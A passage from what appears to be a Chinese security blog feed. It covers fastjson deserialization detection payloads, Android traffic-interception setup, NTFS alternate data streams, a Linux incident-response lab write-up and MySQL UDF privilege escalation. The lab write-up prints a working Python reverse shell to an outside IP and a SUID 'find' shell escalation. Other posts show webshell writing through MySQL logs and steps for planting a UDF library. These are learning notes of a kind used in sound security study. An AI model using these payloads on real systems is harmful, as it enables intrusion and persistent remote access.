class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//下面是一些畸形payload，会报错但是也能触发dnslog</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这里可能有时候探测出现问题，说type not match，其实原因是，有的开发在使用fastjson解析请求时会使用Spring的@RequestBody注释，告诉解析引擎，我需要的是一个User类对象</p><p>最外层一定是数组或者对象，不要加@type，然后将Payload作为其中一个键值，比如：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样写通常就不会有type not match的</p><p><code>下面的探测是存在fastjson并且可以加载字节码的情况，纯粹记录没有尝试过</code></p><h2><span id="操作系统探测">操作系统探测</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2><span id="中间件探测">中间件探测</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2><span id="探测jdk版本">探测JDK版本</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取 Java 版本</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// 解析主版本号</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 进⾏版本判断</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;fastjson介绍&quot;&gt;fastjson介绍&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;官方github地址：&lt;a href=&quot;https://github.com/alibaba/fastjson&quot;&gt;https://github.com/alibaba/fastj</summary>
      
    
    
    
    <category term="java漏洞" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flask内存马学习</title>
    <link href="https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-17T08:42:44.000Z</published>
    <updated>2024-08-17T09:56:06.004Z</updated>
    
    
    
    
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>APP渗透抓包环境配置</title>
    <link href="https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-08-15T10:52:02.000Z</published>
    <updated>2024-08-15T17:34:27.424Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="模拟器代理设置">模拟器代理设置</span></h1><p>这里用雷电模拟器</p><p>ipconfig查看一下本机的IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>然后在burp添加一个新的代理</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>然后模拟器也自定义该ip地址</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1><span id="证书安装">证书安装</span></h1><p>这里如果要抓https还需要安装一下burp证书，参考文章：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>但是Android 从 7.0 开始，系统不再信任用户 CA 证书，安装证书的方式就麻烦一点</p></blockquote><p>首先访问burp的监听地址下载证书</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>打开文件管理器可以看到证书</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>然后用kali里的工具openssl计算证书哈希值</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>将证书名改为<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>然后用<code>MT管理器</code>将其移动到<code>/system/etc/security/cacerts/</code>目录</p><blockquote><p>雷电9这里会出现挂载失败无法移动的情况</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>要在设置–&gt;性能设置修改一下vmdk可写</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>难绷的还是不行，换网易的MuMu模拟器就好了，这雷电模拟器什么毛病🥲</p><p>流程和上面一样，参考文章：<a href="https://blog.csdn.net/shr592833253/article/details/139395912">用手机模拟器进行APP渗透测试抓包(超详细版)_手机模拟器抓包-CSDN博客</a></p><p>证书放过去的时候要记得有足够权限，有些可能不够，可以直接用mt改</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>然后把&#x2F;system这个目录的权限也改成777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>然后就可以正常抓包也没有证书问题了</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;模拟器代理设置&quot;&gt;模拟器代理设置&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;这里用雷电模拟器&lt;/p&gt;
&lt;p&gt;ipconfig查看一下本机的IP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.clown2024.cn/202408151921468.png</summary>
      
    
    
    
    <category term="app渗透" scheme="https://clowsman.github.io/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NTFS数据流隐写</title>
    <link href="https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <id>https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</id>
    <published>2024-07-12T12:39:30.000Z</published>
    <updated>2024-07-15T06:42:10.915Z</updated>
    
    <content type="html"><![CDATA[<p>这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。</p><h1><span id="ntfs数据流介绍">NTFS数据流介绍</span></h1><p>在NTFS文件系统中存在着NTFS备用数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS备用数据流。</p><p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p><p>ADS也被用于一些恶意文件隐藏自身,作为后门。</p><h1><span id="ads应用">ADS应用</span></h1><p>这里写一个隐藏文本来看看，首先创建一个空的example.txt，然后写入ADS，这里写入一个字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#这里要用cmd，用powershell会报错</span><br></code></pre></td></tr></table></figure><p>然后直接打开文件还是空的</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>想要查看ADS的话可以这样</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>还有用下面命令查看该文件所有的ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADS可以写任何东西，包括图片、音频、视频等，所以可以用来隐藏后门，在Windows XP中，可执行文件可以隐藏并且被执行。但是，微软已经发现了这个问题并进行了修复，目前在Windows Vista及后续系统中已经无法直接运行ADS中的可执行文件了。</p><p>可以直接这样写入文件，其他文件同理</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADS数据流文件有三种删除方式。一是直接<strong>删除宿主</strong>文件，二是将宿主文件<strong>移到</strong>FAT32<strong>等非</strong>NTFS<strong>分区中</strong>；三是利用<strong>工具软件</strong>，如IceSword、Ntfs Streams Editor删除。</p><p>Ntfs Streams Editor删除命令如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;ntfs数据流介绍&quot;&gt;NTFS数据流介绍&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;在NTFS文件系统中存在着NTFS备用数据流（Alternate Da</summary>
      
    
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第三章</title>
    <link href="https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2024-07-12T07:53:07.000Z</published>
    <updated>2024-07-15T06:53:06.252Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linux权限维持">Linux权限维持</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc<br>1.黑客隐藏的隐藏的文件 完整路径md5<br>2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;<br>3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; <br>4.黑客尝试注入恶意代码的工具完整路径md5<br>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>这里看了一下web目录没什么东西，直接用D盾全盘查杀一下</p><blockquote><p>这里挂载要指定端口，指定端口的形式是这样的：\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmm但是卡住了扫不出来东西</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>最后是在&#x2F;tmp目录下发现了一个隐藏文件，里面有python脚本&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>其脚本内容</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>其反弹shell的ip和端口就是上面代码中的</p><p>flag{114.114.114.121:9999}</p><blockquote><p>一开始找到一个1.sh的脚本，里面是一个bash反弹shell但是那个玩意不是flag，不知道是不是环境没怎么改。。。</p></blockquote><p>查看黑客的提权命令，先看&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>有个ctf用户，切换到该用户执行下面命令找是否能够suid提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>发现find命令就能提权</p><p>其提权命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmm没想明白这个思路是怎么来的，看别人的wp，难道提权一定是suid吗😥</p></blockquote><p>然后就是找注入代码的恶意工具，这里用下面这个命令查找</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>搜索可以知道这是一个注入工具：<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoa是一款隐秘的后门工具，通过向目标主机上活跃的进程注入恶意代码来执行后门工作，这也反向说明了，实际上Cymothoa后门会拥有和原进程相同的权限，且Cymothoa是通过向系统进程注入shellcode去执行后门，所以不会像以前写过的许多后门一样创建自己的进程，这使得它的隐蔽性提高了很多。</p></blockquote><p>所以其工具路径如下：&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>最后执行一下这个1.py的脚本查询一下网络连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>然后找到一个软链接，这个就是flag(没懂跟题目描述的步骤有什么关系</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>说实话是在没看懂这里是什么意思，看的别人的wp，有点意义不明。。。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;linux权限维持&quot;&gt;Linux权限维持&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;靶机简介&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;</summary>
      
    
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>mysql提权</title>
    <link href="https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
    <id>https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/</id>
    <published>2024-07-11T17:22:48.000Z</published>
    <updated>2024-07-15T06:41:45.285Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1><span id="权限获取">权限获取</span></h1><p>要提权之前首先就要拿到mysql的权限，这里大佬的文章已经说的很详细了，我就记录一些写shell相关的知识</p><p><strong>into outfile写shell</strong></p><p>需要load_file () 开启 即 secure_file_priv 无限制</p><p>可以通过下面命令查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>&#x2F;tmp</td><td>只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p><strong>日志写shell</strong></p><p>可以下面命令查看日志位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>我们可以自己修改日志文件位置，这样就可以写shell进去了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1><span id="udf提权">udf提权</span></h1><p>自定义函数(user defined function)，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p><h2><span id="手工复现">手工复现</span></h2><p><strong>动态链接库</strong></p><p>自定义函数是是使用动态链接库的形式实现的，如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>动态链接库的文件可以去sqlmap和metasploit工具里面去找</p><p><strong>sqlmap的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>里面有windows和Linux的32位和64位的动态链接库</p><p>不过sqlmap里的动态链接库为了防止误杀经过编码处理不能直接使用，不过可以利用sqlmap自带的解码工具来进行解码使用，工具在&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploit的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSF根目录/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msf自带的动态链接库不需要解码可以直接使用</p><blockquote><p>kali里面msf的根目录在&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>下一步就是将链接库放到插件目录下</strong></p><p>可以用下面命令查找插件目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#这样也行</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>如果不存在的话可以找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹</p><p>找mysql的安装目录可以用这个命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>写入动态链接库</strong></p><p>sql注入是post注入可以直接写，因为get有长度限制，这里可以用sqlmap来写</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;url地址&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>也可以直接手工用sql语句写进去，这些前提都是有写权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接 SELECT 查询十六进制写入</span><br>SELECT 0x7f454c4602... 